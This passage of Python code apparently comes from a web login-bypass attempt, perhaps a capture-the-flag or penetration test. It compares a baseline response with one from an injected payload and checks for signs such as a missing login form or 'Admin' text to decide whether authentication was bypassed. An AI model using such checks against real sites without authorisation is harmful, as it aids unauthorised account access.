print(f"Status: {payload_result['status']}")
print(f"Cookies: {payload_result['cookies']}")
print(f"Has 'welcome': {'welcome' in payload_result['text'].lower()}")
print(f"Has 'Access Restricted': {'Access Restricted' in payload_result['text']}")
print(f"Has 'Dashboard': {'dashboard' in payload_result['text'].lower()}")
print(f"Has 'Logged in': {'logged in' in payload_result['text'].lower()}")
print(f"Has 'Admin': {'admin' in payload_result['text'].lower()}")

# Look for key differences
print("\n[COMPARISON]")
if baseline['text'] == payload_result['text']:
    print("[!] Responses are IDENTICAL - payload didn't change anything")
else:
    print("[+] Responses are DIFFERENT - analyze what changed")
    
# Check for form elements
has_login_form_base = 'name="username"' in baseline['text']
has_login_form_payload = 'name="username"' in payload_result['text']
print(f"Baseline has login form: {has_login_form_base}")
print(f"Payload has login form: {has_login_form_payload}")

# Test 3: Try to get full page content for successful login pattern
if has_login_form_payload:
    print("\n[?] Login form still present - may not be bypassed")
else:
    print("\n[!] Login form missing - possible successful authentication")

# Extract the exact context of "welcome"
print("\n" + "="*70)
print("[CONTEXT ANALYSIS] Where does 'welcome' appear?")
print("="*70)
welcome_contexts = re.findall(r'.{0,50}welcome.{0,50}', baseline['text'], re.IGNORECASE)
for i, ctx in enumerate(welcome_contexts, 1):
